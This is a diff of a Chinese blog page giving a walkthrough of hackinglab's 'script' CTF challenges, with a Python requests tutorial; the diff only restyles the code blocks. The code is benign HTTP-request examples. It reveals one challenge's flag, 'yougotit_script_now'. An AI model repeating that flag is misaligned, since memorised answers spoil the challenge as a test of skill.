@@ -13,9 +13,9 @@
     <meta name="description" content="脚本关key又又找不到了分值: 200
 小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！
 右键查看源代码
-&amp;lt;html&amp;gt;
-    &amp;lt;head&amp;gt;
-        ">
+&amp;lt;html&gt;
+    &amp;lt;head&gt;
+        &amp;lt;me">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -875,14 +875,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        3.7k
+                        3.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        18 分
+                        15 分
                     </div>
                     
                 
@@ -902,255 +902,265 @@
                 <h1 id="脚本关"><a href="#脚本关" class="headerlink" title="脚本关"></a>脚本关</h1><h2 id="key又又找不到了"><a href="#key又又找不到了" class="headerlink" title="key又又找不到了"></a>key又又找不到了</h2><p>分值: 200</p>
 <p>小明这次哭了，key又找不到了！！！ key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！</p>
 <p>右键查看源代码</p>
-<pre><code>&lt;html&gt;
-    &lt;head&gt;
-        &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
-    &lt;/head&gt;
-    &lt;body&gt;
-        &lt;a href=&quot;./search_key.php&quot;&gt;_到这里找key__&lt;/a&gt;
-    &lt;/body&gt;
-&lt;/html&gt;</code></pre><p>编写脚本：</p>
-<pre><code>import requests
-url = &quot;http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php&quot;
-res = requests.get(url)
-print(res.text)</code></pre><p>这就好像模拟了抓包的一个过程</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./search_key.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>_到这里找key__<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>编写脚本：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"</span>
+res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这就好像模拟了抓包的一个过程</p>
 <p>得到：key is : yougotit_script_now</p>
 <h2 id="快速口算"><a href="#快速口算" class="headerlink" title="快速口算"></a>快速口算</h2><p>分值: 350</p>
 <p>小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？</p>
 <p>恶补基础↓：</p>
-<h3 id="1-Requests模块的简单使用"><a href="#1-Requests模块的简单使用" class="headerlink" title="1.Requests模块的简单使用"></a><strong>1.Requests模块的简单使用</strong></h3><pre><code>#HTTP请求类型
-#无参数的get类型
-r = requests.get(&#39;http://httpbin.org/get&#39;)
-#有参的get类型
-payload = {&#39;key1&#39;:&#39;vaule1&#39;,&#39;key2&#39;:&#39;value2&#39;}
-r = requests.get(url,params=payload)
-#无参的post类型
-r = requests.post(&quot;http://httpbin.org/post&quot;)
-#有参的post类型
-r = requests.post(url,data=payload)
-#data不光可以接受字典类型的数据，还可以接受json等格式
-import json
-payload = {&#39;a&#39;:&#39;杨&#39;,&#39;b&#39;:&#39;hello&#39;}
-r = requests.post(&#39;http://httpbin.org/post&#39;, data=json.dumps(payload))
-#发送文件的post类型，这个相当于向网站上传一张图片，文档等操作，这时要使用files参数
-files = {&#39;file&#39;: open(&#39;touxiang.png&#39;, &#39;rb&#39;)}
-r = requests.post(&#39;http://httpbin.org/post&#39;, files=files)
-#put类型
-r = requests.put(&quot;http://m.ctrip.com/put&quot;)
-#delete类型
-r = requests.delete(&quot;http://m.ctrip.com/delete&quot;)
-#head类型
-r = requests.head(&quot;http://m.ctrip.com/head&quot;)
-#options类型
-r = requests.options(&quot;http://m.ctrip.com/get&quot;)
+<h3 id="1-Requests模块的简单使用"><a href="#1-Requests模块的简单使用" class="headerlink" title="1.Requests模块的简单使用"></a><strong>1.Requests模块的简单使用</strong></h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#HTTP请求类型</span>
+<span class="token comment" spellcheck="true">#无参数的get类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/get'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#有参的get类型</span>
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'key1'</span><span class="token punctuation">:</span><span class="token string">'vaule1'</span><span class="token punctuation">,</span><span class="token string">'key2'</span><span class="token punctuation">:</span><span class="token string">'value2'</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#无参的post类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://httpbin.org/post"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#有参的post类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#data不光可以接受字典类型的数据，还可以接受json等格式</span>
+<span class="token keyword">import</span> json
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span><span class="token string">'杨'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">:</span><span class="token string">'hello'</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#发送文件的post类型，这个相当于向网站上传一张图片，文档等操作，这时要使用files参数</span>
+files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'touxiang.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://httpbin.org/post'</span><span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#put类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>put<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/put"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#delete类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>delete<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/delete"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#head类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>head<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/head"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#options类型</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>options<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/get"</span><span class="token punctuation">)</span>
 
-#获取响应内容
-print r.content #以字节的方式去显示，中文显示为字符
-print r.text #以文本的方式去显示
+<span class="token comment" spellcheck="true">#获取响应内容</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>content <span class="token comment" spellcheck="true">#以字节的方式去显示，中文显示为字符</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>text <span class="token comment" spellcheck="true">#以文本的方式去显示</span>
 
-#URL传递参数
-payload = {&#39;keyword&#39;: &#39;日本&#39;, &#39;salecityid&#39;: &#39;2&#39;}
-r = requests.get(&quot;http://m.ctrip.com/webapp/tourvisa/visa_list&quot;, params=payload)
-print r.url #示例为http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=日本
+<span class="token comment" spellcheck="true">#URL传递参数</span>
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'keyword'</span><span class="token punctuation">:</span> <span class="token string">'日本'</span><span class="token punctuation">,</span> <span class="token string">'salecityid'</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://m.ctrip.com/webapp/tourvisa/visa_list"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>url <span class="token comment" spellcheck="true">#示例为http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=日本</span>
 
-#获取/修改网页编码
-r = requests.get(&#39;https://github.com/timeline.json&#39;)
-print r.encoding
-r.encoding = &#39;utf-8&#39;
+<span class="token comment" spellcheck="true">#获取/修改网页编码</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>encoding
+r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>
 
-#json处理
-r = requests.get(&#39;https://github.com/timeline.json&#39;)
-print r.json() #需要先import json
+<span class="token comment" spellcheck="true">#json处理</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'https://github.com/timeline.json'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#需要先import json</span>
 
-#定制请求头
-url = &#39;http://m.ctrip.com&#39;
-headers = {&#39;User-Agent&#39; : &#39;Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19&#39;}
-r = requests.post(url, headers=headers)
-print r.request.headers
+<span class="token comment" spellcheck="true">#定制请求头</span>
+url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span> <span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19'</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers
 
-#复杂post请求
-url = &#39;http://m.ctrip.com&#39;
-payload = {&#39;some&#39;: &#39;data&#39;}
-r = requests.post(url, data=json.dumps(payload)) #如果传递的payload是string而不是dict，需要先调用dumps方法格式化一下
+<span class="token comment" spellcheck="true">#复杂post请求</span>
+url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>
+payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'some'</span><span class="token punctuation">:</span> <span class="token string">'data'</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#如果传递的payload是string而不是dict，需要先调用dumps方法格式化一下</span>
 
-#post多部分编码文件
-url = &#39;http://m.ctrip.com&#39;
-files = {&#39;file&#39;: open(&#39;report.xls&#39;, &#39;rb&#39;)}
-r = requests.post(url, files=files)
+<span class="token comment" spellcheck="true">#post多部分编码文件</span>
+url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com'</span>
+files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span><span class="token string">'report.xls'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>
 
-#响应状态码
-r = requests.get(&#39;http://m.ctrip.com&#39;)
-print r.status_code
+<span class="token comment" spellcheck="true">#响应状态码</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>status_code
 
-#响应头
-r = requests.get(&#39;http://m.ctrip.com&#39;)
-print r.headers
-print r.headers[&#39;Content-Type&#39;]
-print r.headers.get(&#39;content-type&#39;) #访问响应头部分内容的两种方式
+<span class="token comment" spellcheck="true">#响应头</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>headers
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#访问响应头部分内容的两种方式</span>
 
-#Cookies
-r = requests.get(&#39;http://www.baidu.com&#39;)
-r.cookies[&#39;BAIDUID&#39;]  #读取cookies
+<span class="token comment" spellcheck="true">#Cookies</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">'BAIDUID'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#读取cookies</span>
 
-url = &#39;http://m.ctrip.com/cookies&#39;
-cookies = dict(cookies_are=&#39;working&#39;)
-r = requests.get(url, cookies=cookies) #发送cookies
+url <span class="token operator">=</span> <span class="token string">'http://m.ctrip.com/cookies'</span>
+cookies <span class="token operator">=</span> dict<span class="token punctuation">(</span>cookies_are<span class="token operator">=</span><span class="token string">'working'</span><span class="token punctuation">)</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#发送cookies</span>
 
-#设置超时时间
-r = requests.get(&#39;http://m.ctrip.com&#39;, timeout=0.001)
-#访问中使用session
-s = requests.Session() #先初始化一个session对象
-r = s.post(url,data = user) #然后使用这个session对象来进行访问，将requests中的session类实例化为一个对象。以便于在请求头中自动加上session id。
-#设置访问代理
-proxies = {
-           &quot;http&quot;: &quot;http://10.10.10.10:8888&quot;,
-           &quot;https&quot;: &quot;http://10.10.10.100:4444&quot;,
-          }
-r = requests.get(&#39;http://m.ctrip.com&#39;, proxies=proxies)</code></pre><h3 id="2-json请求"><a href="#2-json请求" class="headerlink" title="2.json请求"></a>2.json请求</h3><pre><code>#!/user/bin/env python
-#coding=utf-8
-import requests
-import json
+<span class="token comment" spellcheck="true">#设置超时时间</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.001</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#访问中使用session</span>
+s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#先初始化一个session对象</span>
+r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> user<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#然后使用这个session对象来进行访问，将requests中的session类实例化为一个对象。以便于在请求头中自动加上session id。</span>
+<span class="token comment" spellcheck="true">#设置访问代理</span>
+proxies <span class="token operator">=</span> <span class="token punctuation">{</span>
+           <span class="token string">"http"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.10:8888"</span><span class="token punctuation">,</span>
+           <span class="token string">"https"</span><span class="token punctuation">:</span> <span class="token string">"http://10.10.10.100:4444"</span><span class="token punctuation">,</span>
+          <span class="token punctuation">}</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://m.ctrip.com'</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="2-json请求"><a href="#2-json请求" class="headerlink" title="2.json请求"></a>2.json请求</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span>
+<span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> json
 
-class url_request():
-    def __init__(self):
-            &quot;&quot;&quot; init &quot;&quot;&quot;
+<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token triple-quoted-string string">""" init """</span>
 
-if __name__==&#39;__main__&#39;:
-    headers = {&#39;Content-Type&#39; : &#39;application/json&#39;}
-    payload = {&#39;CountryName&#39;:&#39;中国&#39;,
-               &#39;ProvinceName&#39;:&#39;陕西省&#39;,
-               &#39;L1CityName&#39;:&#39;汉中&#39;,
-               &#39;L2CityName&#39;:&#39;城固&#39;,
-               &#39;TownName&#39;:&#39;&#39;,
-               &#39;Longitude&#39;:&#39;107.33393&#39;,
-               &#39;Latitude&#39;:&#39;33.157131&#39;,
-               &#39;Language&#39;:&#39;CN&#39;
-               }
-    r = requests.post(&quot;http://www.xxxxxx.com/CityLocation/json/LBSLocateCity&quot;,headers=headers,data=payload)
-    #r.encoding = &#39;utf-8&#39;
-    data=r.json()
-    if r.status_code!=200:
-        print &quot;LBSLocateCity API Error &quot; + str(r.status_code)
-    print data[&#39;CityEntities&#39;][0][&#39;CityID&#39;] #打印返回json中的某个key的value
-    print data[&#39;ResponseStatus&#39;][&#39;Ack&#39;]
-    print json.dumps(data,indent=4,sort_keys=True,ensure_ascii=False) #树形打印json，ensure_ascii必须设为False否则中文会显示为unicode</code></pre><h3 id="3-xml请求"><a href="#3-xml请求" class="headerlink" title="3.xml请求"></a>3.xml请求</h3><pre><code>#!/user/bin/env python
-#coding=utf-8
-import requests
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span> <span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'CountryName'</span><span class="token punctuation">:</span><span class="token string">'中国'</span><span class="token punctuation">,</span>
+               <span class="token string">'ProvinceName'</span><span class="token punctuation">:</span><span class="token string">'陕西省'</span><span class="token punctuation">,</span>
+               <span class="token string">'L1CityName'</span><span class="token punctuation">:</span><span class="token string">'汉中'</span><span class="token punctuation">,</span>
+               <span class="token string">'L2CityName'</span><span class="token punctuation">:</span><span class="token string">'城固'</span><span class="token punctuation">,</span>
+               <span class="token string">'TownName'</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">,</span>
+               <span class="token string">'Longitude'</span><span class="token punctuation">:</span><span class="token string">'107.33393'</span><span class="token punctuation">,</span>
+               <span class="token string">'Latitude'</span><span class="token punctuation">:</span><span class="token string">'33.157131'</span><span class="token punctuation">,</span>
+               <span class="token string">'Language'</span><span class="token punctuation">:</span><span class="token string">'CN'</span>
+               <span class="token punctuation">}</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://www.xxxxxx.com/CityLocation/json/LBSLocateCity"</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>
+    data<span class="token operator">=</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code<span class="token operator">!=</span><span class="token number">200</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"LBSLocateCity API Error "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> data<span class="token punctuation">[</span><span class="token string">'CityEntities'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'CityID'</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#打印返回json中的某个key的value</span>
+    <span class="token keyword">print</span> data<span class="token punctuation">[</span><span class="token string">'ResponseStatus'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'Ack'</span><span class="token punctuation">]</span>
+    <span class="token keyword">print</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>sort_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#树形打印json，ensure_ascii必须设为False否则中文会显示为unicode</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="3-xml请求"><a href="#3-xml请求" class="headerlink" title="3.xml请求"></a>3.xml请求</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/user/bin/env python</span>
+<span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">import</span> requests
 
-class url_request():
-    def __init__(self):
-            &quot;&quot;&quot; init &quot;&quot;&quot;
+<span class="token keyword">class</span> <span class="token class-name">url_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token triple-quoted-string string">""" init """</span>
 
-if __name__==&#39;__main__&#39;:
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
 
-    headers = {&#39;Content-type&#39;: &#39;text/xml&#39;}
-    XML = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;&lt;soap:Body&gt;&lt;Request xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;jme&gt;&lt;JobClassFullName&gt;WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;/JobClassFullName&gt;&lt;Action&gt;RUN&lt;/Action&gt;&lt;Param&gt;1&lt;/Param&gt;&lt;HostIP&gt;127.0.0.1&lt;/HostIP&gt;&lt;JobInfo&gt;1&lt;/JobInfo&gt;&lt;NeedParallel&gt;false&lt;/NeedParallel&gt;&lt;/jme&gt;&lt;/Request&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#39;
-    url = &#39;http://jobws.push.mobile.xxxxxxxx.com/RefreshWeiXInTokenJob/RefreshService.asmx&#39;
-    r = requests.post(url,headers=headers,data=XML)
-    #r.encoding = &#39;utf-8&#39;
-    data = r.text
-    print data</code></pre><h3 id="5-Requests模拟登入实例"><a href="#5-Requests模拟登入实例" class="headerlink" title="5.Requests模拟登入实例"></a>5.Requests模拟登入实例</h3><pre><code>import requests
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'text/xml'</span><span class="token punctuation">}</span>
+    XML <span class="token operator">=</span> <span class="token string">'&lt;?xml version="1.0" encoding="utf-8"?>&lt;soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">&lt;soap:Body>&lt;Request xmlns="http://tempuri.org/">&lt;jme>&lt;JobClassFullName>WeChatJSTicket.JobWS.Job.JobRefreshTicket,WeChatJSTicket.JobWS&lt;/JobClassFullName>&lt;Action>RUN&lt;/Action>&lt;Param>1&lt;/Param>&lt;HostIP>127.0.0.1&lt;/HostIP>&lt;JobInfo>1&lt;/JobInfo>&lt;NeedParallel>false&lt;/NeedParallel>&lt;/jme>&lt;/Request>&lt;/soap:Body>&lt;/soap:Envelope>'</span>
+    url <span class="token operator">=</span> <span class="token string">'http://jobws.push.mobile.xxxxxxxx.com/RefreshWeiXInTokenJob/RefreshService.asmx'</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>XML<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true">#r.encoding = 'utf-8'</span>
+    data <span class="token operator">=</span> r<span class="token punctuation">.</span>text
+    <span class="token keyword">print</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="5-Requests模拟登入实例"><a href="#5-Requests模拟登入实例" class="headerlink" title="5.Requests模拟登入实例"></a>5.Requests模拟登入实例</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests
 
